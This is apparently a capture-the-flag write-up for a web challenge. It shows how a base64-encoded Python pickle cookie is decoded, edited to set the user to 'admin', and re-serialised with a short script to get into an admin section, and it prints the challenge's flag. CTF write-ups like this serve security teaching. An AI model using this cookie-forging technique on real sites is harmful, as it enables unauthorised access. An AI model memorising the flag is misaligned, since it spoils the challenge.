### Solved by Swappage

Spotted Quoll was another web challenge worth 50 points, the objective is to break in the admin section of the site.

Again, we are dealing with cookies

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Cache-Control: no-cache
    Date: Sat, 30 Apr 2016 17:41:14 GMT
    Server: Google Frontend
    Content-Length: 0
    Set-Cookie: obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu; Path=/
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Expires: Sat, 30 Apr 2016 17:41:14 GMT
    Connection: close

this time, as the cookie name suggests, we are dealing with a python pickle serialized object base64 encoded.

if we unserialize the object we get the following:

    {'python': 'pickles', 'subtle': 'hint', 'user': None}

we simply replace the *None* with the string 'admin' to bypass the check.

```python
#!/usr/bin/python

import pickle


with open('b.txt','wb') as f:
	bla = {'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}
	pickle.dump(bla, f)
```
let's base64 encode the output of the serialized object and send it to website, so we can login as admin!

Your flag is CTF{but_wait,theres_more.if_you_call}
